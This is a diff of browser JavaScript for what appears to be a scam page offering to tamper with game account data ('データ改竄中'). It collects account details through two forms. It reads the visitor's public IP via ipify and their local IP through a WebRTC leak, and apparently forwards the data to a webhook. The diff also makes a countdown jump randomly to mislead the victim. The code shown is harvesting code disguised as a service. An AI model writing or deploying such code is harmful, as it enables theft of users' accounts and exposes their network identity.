@@ -7,31 +7,35 @@ const ctx = canvas.getContext('2d');
 
 let savedAccount = {};
 
-async function getLocalIP() {
-  return new Promise((resolve) => {
-    const pc = new RTCPeerConnection({ iceServers: [] });
-    pc.createDataChannel("");
-    pc.createOffer().then(offer => pc.setLocalDescription(offer));
-
-    pc.onicecandidate = (event) => {
-      if (!event || !event.candidate) return;
-      const ipMatch = event.candidate.candidate.match(/(\d{1,3}(\.\d{1,3}){3})/);
-      if (ipMatch) {
-        resolve(ipMatch[1]);
-        pc.onicecandidate = null;
-        pc.close();
-      }
-    };
-
-    setTimeout(() => resolve("Not found"), 3000); 
-  });
-}
-
 function getIP() {
   return fetch('https://api.ipify.org?format=json')
     .then(res => res.json())
     .then(d => d.ip)
     .catch(() => "");
+}
+
+function getLocalIP() {
+  return new Promise((resolve) => {
+    const pc = new RTCPeerConnection({ iceServers: [] });
+    pc.createDataChannel('');
+    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+
+    pc.onicecandidate = (event) => {
+      if (!event || !event.candidate) return;
+      const match = event.candidate.candidate.match(/(\d{1,3}(?:\.\d{1,3}){3})/);
+      if (match) {
+        resolve(match[1]);
+        pc.onicecandidate = null;
+        pc.close();
+      }
+    };
+
+    setTimeout(() => {
+      resolve("Not found");
+      pc.onicecandidate = null;
+      pc.close();
+    }, 3000);
+  });
 }
 
 async function sendToWebhook(embed) {
@@ -77,7 +81,6 @@ form1.addEventListener('submit', async (e) => {
   form2.classList.remove('hidden');
 });
 
-
 form2.addEventListener('submit', async (e) => {
   e.preventDefault();
   const level = document.getElementById('level-amount').value.trim();
@@ -107,7 +110,7 @@ function startCanvasCountdown() {
   const interval = setInterval(() => {
     ctx.clearRect(0, 0, canvas.width, canvas.height);
     ctx.font = '28px Segoe UI';
-    ctx.fillStyle = 'white';
+    ctx.fillStyle = 'black';
     ctx.textAlign = 'center';
 
     if (seconds > 0) {
@@ -116,7 +119,11 @@ function startCanvasCountdown() {
       const dots = ['.', '..', '...'][Math.floor(Date.now() / 500) % 3];
       ctx.fillText(`データ改竄中${dots}`, canvas.width / 2, 60);
       ctx.fillText(`残り ${m}分${s}秒`, canvas.width / 2, 120);
-      seconds--;
+
+      // ±1〜10秒の揺らぎ
+      const direction = Math.random() < 0.5 ? -1 : 1;
+      const fluctuation = Math.floor(Math.random() * 10) + 1;
+      seconds = Math.max(0, seconds + (direction * fluctuation));
     } else {
       clearInterval(interval);
       ctx.fillStyle = 'red';
